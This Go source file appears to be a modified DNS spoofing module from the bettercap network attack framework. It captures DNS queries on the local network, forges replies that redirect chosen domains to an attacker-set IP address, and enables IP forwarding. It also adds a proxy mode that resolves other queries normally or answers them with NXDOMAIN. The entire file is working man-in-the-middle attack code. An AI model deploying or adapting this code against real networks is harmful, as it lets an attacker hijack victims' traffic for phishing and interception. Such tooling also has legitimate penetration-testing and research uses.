package dns_spoof

import (
	"bytes"
	"fmt"
	"net"
	"sync"
	"context"
	"bufio"
	"os"
	"regexp"

	"github.com/bettercap/bettercap/packets"
	"github.com/bettercap/bettercap/session"

	"github.com/google/gopacket"
	"github.com/google/gopacket/layers"
	"github.com/google/gopacket/pcap"

	"github.com/evilsocket/islazy/tui"
)

type DNSSpoofer struct {
	session.SessionModule
	Handle        *pcap.Handle
	Hosts         Hosts
	All           bool
	ProxyDNS      bool
	ProxyDNSIP    net.IP
	ProxyResolver *net.Resolver
	waitGroup     *sync.WaitGroup
	pktSourceChan chan gopacket.Packet
}

func NewDNSSpoofer(s *session.Session) *DNSSpoofer {
	mod := &DNSSpoofer{
		SessionModule: session.NewSessionModule("dns.spoof", s),
		Handle:        nil,
		All:           false,
		ProxyDNS:      false,
		ProxyDNSIP:    nil,
		ProxyResolver: nil,
		Hosts:         Hosts{},
		waitGroup:     &sync.WaitGroup{},
	}

	mod.AddParam(session.NewStringParameter("dns.spoof.hosts",
		"",
		"",
		"If not empty, this hosts file will be used to map domains to IP addresses."))

	mod.AddParam(session.NewStringParameter("dns.spoof.domains",
		"",
		"",
		"Comma separated values of domain names to spoof."))

	mod.AddParam(session.NewStringParameter("dns.spoof.address",
		session.ParamIfaceAddress,
		session.IPv4Validator,
		"IP address to map the domains to."))

	mod.AddParam(session.NewBoolParameter("dns.spoof.all",
		"false",
		"If true the module will reply to every DNS request, otherwise it will only reply to the one targeting the local pc."))

	mod.AddParam(session.NewBoolParameter("dns.spoof.proxy",
		"false",
		"If true the module will reply to every DNS request, with faked entries for selected domains and real ones for non-selected domains."))

	mod.AddParam(session.NewStringParameter("dns.spoof.proxy.srv",
		"system",
		"",
		"IP address of proxy dns server or 'system' for system dns"))

	mod.AddHandler(session.NewModuleHandler("dns.spoof on", "",
		"Start the DNS spoofer in the background.",
		func(args []string) error {
			return mod.Start()
		}))

	mod.AddHandler(session.NewModuleHandler("dns.spoof off", "",
		"Stop the DNS spoofer in the background.",
		func(args []string) error {
			return mod.Stop()
		}))

	return mod
}

func (mod DNSSpoofer) Name() string {
	return "dns.spoof"
}

func (mod DNSSpoofer) Description() string {
	return "Replies to DNS messages with spoofed responses."
}

func (mod DNSSpoofer) Author() string {
	return "Simone Margaritelli <evilsocket@gmail.com>"
}

func (mod *DNSSpoofer)getSystemResolver() (net.IP,error) {
	file, err := os.Open("/etc/resolv.conf")
	if err != nil {
	    return nil,err
	}
	defer file.Close()

	scanner := bufio.NewScanner(file)
	r := regexp.MustCompile(`^\s*nameserver\s*(?P<IP>\d+\.\d+\.\d+\.\d+)`)
	for scanner.Scan() {
	    matches := r.FindStringSubmatch(scanner.Text())
	    if len(matches) == 2 {
	        ip := net.ParseIP(matches[1])
	        if ip != nil {
	            mod.Info("using system dns server for proxy dns: %s",matches[1])
	            return ip,nil
	        }
	    }
	}

	if err := scanner.Err(); err != nil {
	    return nil,err
	}
	return nil,fmt.Errorf("no nameserver found for proxy dns")
}

func (mod *DNSSpoofer) Configure() error {
	var err error
	var hostsFile string
	var domains []string
	var address net.IP
	var proxyip string

	if mod.Running() {
		return session.ErrAlreadyStarted
	} else if mod.Handle, err = pcap.OpenLive(mod.Session.Interface.Name(), 65536, true, pcap.BlockForever); err != nil {
		return err
	} else if err = mod.Handle.SetBPFFilter("udp and port 53"); err != nil {
		return err
	} else if err, mod.All = mod.BoolParam("dns.spoof.all"); err != nil {
		return err
	} else if err, address = mod.IPParam("dns.spoof.address"); err != nil {
		return err
	} else if err, domains = mod.ListParam("dns.spoof.domains"); err != nil {
		return err
	} else if err, hostsFile = mod.StringParam("dns.spoof.hosts"); err != nil {
		return err
	} else if err, mod.ProxyDNS = mod.BoolParam("dns.spoof.proxy"); err != nil {
		return err
	} else if err, proxyip = mod.StringParam("dns.spoof.proxy.srv"); err != nil {
		return err
	}

	mod.Hosts = Hosts{}
	for _, domain := range domains {
		mod.Hosts = append(mod.Hosts, NewHostEntry(domain, address))
	}

	if hostsFile != "" {
		mod.Info("loading hosts from file %s ...", hostsFile)
		if err, hosts := HostsFromFile(hostsFile); err != nil {
			return fmt.Errorf("error reading hosts from file %s: %v", hostsFile, err)
		} else {
			mod.Hosts = append(mod.Hosts, hosts...)
		}
	}

	if len(mod.Hosts) == 0 {
		return fmt.Errorf("at least dns.spoof.hosts or dns.spoof.domains must be filled")
	}

	for _, entry := range mod.Hosts {
		mod.Info("%s -> %s", entry.Host, entry.Address)
	}

	if mod.ProxyDNS {
	    if proxyip == "system" {
	        if mod.ProxyDNSIP, err = mod.getSystemResolver(); err != nil {
	            return err
	        }
	    } else {
	        mod.ProxyDNSIP = net.ParseIP(proxyip)
	        if mod.ProxyDNSIP == nil {
	            return fmt.Errorf("invalid dns server ip %s",proxyip)
	        }
	    }
	   
	    dailer := func(ctx context.Context, network, address string) (net.Conn, error) {
	        d := net.Dialer{}
	        return d.DialContext(ctx, "udp", proxyip + ":53")
	    }

	    mod.ProxyResolver = &net.Resolver{
	        Dial: dailer,
	        PreferGo: true,
	    }

	    if mod.ProxyResolver == nil {
	        return fmt.Errorf("dns.spoof.proxy.srv must be filled with dns server ip or 'system'")
	    }
	}

	if !mod.Session.Firewall.IsForwardingEnabled() {
		mod.Info("enabling forwarding.")
		mod.Session.Firewall.EnableForwarding(true)
	}

	return nil
}

func (mod *DNSSpoofer) dnsSend(eth *layers.Ethernet, src net.IP, dst net.IP, udp *layers.UDP, dns *layers.DNS) {
	var err error = nil
	var raw []byte

	if len(src) == net.IPv4len {
	    ip4 := layers.IPv4{
	        Protocol: layers.IPProtocolUDP,
	        Version:  4,
	        TTL:      64,
	        SrcIP:    src,
	        DstIP:    dst,
	    }
	    udp.SetNetworkLayerForChecksum(&ip4)
	    err, raw = packets.Serialize(eth, &ip4, udp, dns)
	} else if len(src) == net.IPv6len {
	    ip6 := layers.IPv6{
	        Version:    6,
	        NextHeader: layers.IPProtocolUDP,
	        HopLimit:   64,
	        SrcIP:      src,
	        DstIP:      dst,
	    }
	    udp.SetNetworkLayerForChecksum(&ip6)
	    err, raw = packets.Serialize(eth, &ip6, udp, dns)
	} else {
	    mod.Error("invalid protocol for dns proxy.")
	}
	if err != nil {
	    mod.Error("error serializing packet: %s.", err)
	    return
	}

	mod.Debug("sending %d bytes of packet ...", len(raw))
	if err := mod.Session.Queue.Send(raw); err != nil {
		mod.Error("error sending packet: %s", err)
	}
}

func (mod *DNSSpoofer) generateGenericLayers(pkt gopacket.Packet, peth *layers.Ethernet, pudp *layers.UDP, target net.HardwareAddr)(eth *layers.Ethernet, src net.IP, dst net.IP, udp *layers.UDP, err error) {
	nlayer := pkt.NetworkLayer()
	if nlayer == nil {
		return nil,nil,nil,nil,fmt.Errorf("missing network layer skipping packet.")
	}

	var eType layers.EthernetType
	if nlayer.LayerType() == layers.LayerTypeIPv4 {
		pip := pkt.Layer(layers.LayerTypeIPv4).(*layers.IPv4)
		src = pip.DstIP
		dst = pip.SrcIP
		eType = layers.EthernetTypeIPv4

	} else {
		pip := pkt.Layer(layers.LayerTypeIPv6).(*layers.IPv6)
		src = pip.DstIP
		dst = pip.SrcIP
		eType = layers.EthernetTypeIPv6
	}

	eth = &layers.Ethernet{
		SrcMAC:       peth.DstMAC,
		DstMAC:       target,
		EthernetType: eType,
	}

	udp = &layers.UDP{
	    SrcPort: pudp.DstPort,
	    DstPort: pudp.SrcPort,
	}

	return eth,src,dst,udp,nil
}

func (mod *DNSSpoofer) dnsNXDomain(pkt gopacket.Packet, peth *layers.Ethernet, pudp *layers.UDP, req *layers.DNS, target net.HardwareAddr) { 

	eth, src, dst, udp, err := mod.generateGenericLayers(pkt, peth, pudp, target)
	if err != nil {
		mod.Debug("%s",err)
	}

	dns := &layers.DNS{
		ID:        req.ID,
		QR:        true,
		OpCode:    layers.DNSOpCodeQuery,
	    ResponseCode: layers.DNSResponseCodeNXDomain,
		QDCount:   req.QDCount,
		Questions: req.Questions,
	}

	mod.dnsSend(eth, src, dst, udp, dns)
}

func (mod *DNSSpoofer) dnsReply(pkt gopacket.Packet, peth *layers.Ethernet, pudp *layers.UDP, domain string, address net.IP, req *layers.DNS, target net.HardwareAddr) {	redir := fmt.Sprintf("(->%s)", address.String())
	who := target.String()

	if t, found := mod.Session.Lan.Get(target.String()); found {
		who = t.String()
	}

	eth, src, dst, udp, err := mod.generateGenericLayers(pkt, peth, pudp, target)
	if err != nil {
		mod.Debug("%s",err)
	}

	mod.Info("sending spoofed DNS reply for %s %s to %s.", tui.Red(domain), tui.Dim(redir), tui.Bold(who))

	answers := make([]layers.DNSResourceRecord, 0)
	for _, q := range req.Questions {
		answers = append(answers,
			layers.DNSResourceRecord{
				Name:  []byte(q.Name),
				Type:  q.Type,
				Class: q.Class,
				TTL:   1024,
				IP:    address,
			})
	}

	dns := &layers.DNS{
		ID:        req.ID,
		QR:        true,
		OpCode:    layers.DNSOpCodeQuery,
		QDCount:   req.QDCount,
		Questions: req.Questions,
		Answers:   answers,
	}

	mod.dnsSend(eth, src, dst, udp, dns)
}

func (mod *DNSSpoofer) proxyPacket() {
}

func (mod *DNSSpoofer) onPacket(pkt gopacket.Packet) {
	typeEth := pkt.Layer(layers.LayerTypeEthernet)
	typeUDP := pkt.Layer(layers.LayerTypeUDP)
	if typeEth == nil || typeUDP == nil {
		return
	}
	eth := typeEth.(*layers.Ethernet)

	var sip net.IP = nil
	var dip net.IP = nil
	srcip := "n/a"
	destip := "n/a"

	if mod.ProxyDNS {
	    if eth.NextLayerType() == layers.LayerTypeIPv4 {
	        pip := pkt.Layer(layers.LayerTypeIPv4).(*layers.IPv4)
	        sip = pip.SrcIP
	        dip = pip.DstIP
	    } else if eth.NextLayerType() == layers.LayerTypeIPv6 {
	        pip := pkt.Layer(layers.LayerTypeIPv6).(*layers.IPv6)
	        sip = pip.DstIP
	        dip = pip.SrcIP
	    } else {
	        mod.Debug("skip invalid ip protocol: %s",eth.NextLayerType())
	        return
	    }
	    if sip != nil {
	        srcip = sip.String()
	    }
	    if dip != nil {
	        destip = dip.String()
	    }
	    if sip != nil && sip.Equal(mod.ProxyDNSIP) && dip != nil && mod.Session.Interface.IP.Equal(dip) {
	        mod.Debug("dns.spoof.proxyDNS skipping dns proxy-answer (from server) %s => %s", srcip, destip)
	        return
	    }
	    if  sip != nil && mod.Session.Interface.IP.Equal(sip) && dip != nil && dip.Equal(mod.ProxyDNSIP) {
	        mod.Debug("dns.spoof.proxyDNS skipping dns proxy-request (to server) %s => %s", srcip, destip)
	        return
	    }
	    if  sip != nil && mod.Session.Interface.IP.Equal(sip) {
	        mod.Debug("dns.spoof.proxyDNS skipping dns proxy-answer (to client) %s => %s", srcip, destip)
	        return
	    }
	} else if !mod.All && !bytes.Equal(eth.DstMAC, mod.Session.Interface.HW) {
	    mod.Debug("!dns.spoof.All => deny non-local")
	    return
	}

	dns, parsed := pkt.Layer(layers.LayerTypeDNS).(*layers.DNS)
	if !parsed || dns.OpCode != layers.DNSOpCodeQuery || len(dns.Questions) == 0 || len(dns.Answers) > 0 {
	    mod.Debug("blackholing dns answer: %s => %s", srcip, destip)
	    return
	}

	udp := typeUDP.(*layers.UDP)
	for _, q := range dns.Questions {
	    qName := string(q.Name)
	    if address := mod.Hosts.Resolve(qName); address != nil {
	        mod.Debug("replying dns query by host lookup %s: %s => %s", qName, srcip, destip )
	        mod.dnsReply(pkt, eth, udp, qName, address, dns, eth.SrcMAC)
	        break
	    } else if mod.ProxyDNS {
	        mod.Debug("proxying dns query %s: %s => %s", qName, srcip, destip )
	        addr, err := net.LookupHost(qName)
	        if err != nil || len(addr) == 0 {
	            mod.Debug("replying dns query by nxdomain %s: %s => %s", qName, srcip, destip )
	            mod.dnsNXDomain(pkt, eth, udp, dns, eth.SrcMAC)
	            break
	        } else {
	            mod.Debug("replying dns query by proxy lookup %s: %s => %s", qName, srcip, destip )
	            mod.dnsReply(pkt, eth, udp, qName, net.ParseIP(addr[0]), dns, eth.SrcMAC)
	            break
	        }
	    } else {
	        mod.Debug("skipping domain %s", string(q.Name))
	    }
	}
}

func (mod *DNSSpoofer) Start() error {
	if err := mod.Configure(); err != nil {
		return err
	}

	return mod.SetRunning(true, func() {
		mod.waitGroup.Add(1)
		defer mod.waitGroup.Done()

		src := gopacket.NewPacketSource(mod.Handle, mod.Handle.LinkType())
		mod.pktSourceChan = src.Packets()
		for packet := range mod.pktSourceChan {
			if !mod.Running() {
				break
			}

			mod.onPacket(packet)
		}
	})
}

func (mod *DNSSpoofer) Stop() error {
	return mod.SetRunning(false, func() {
		mod.pktSourceChan <- nil
		mod.Handle.Close()
		mod.waitGroup.Wait()
	})
}
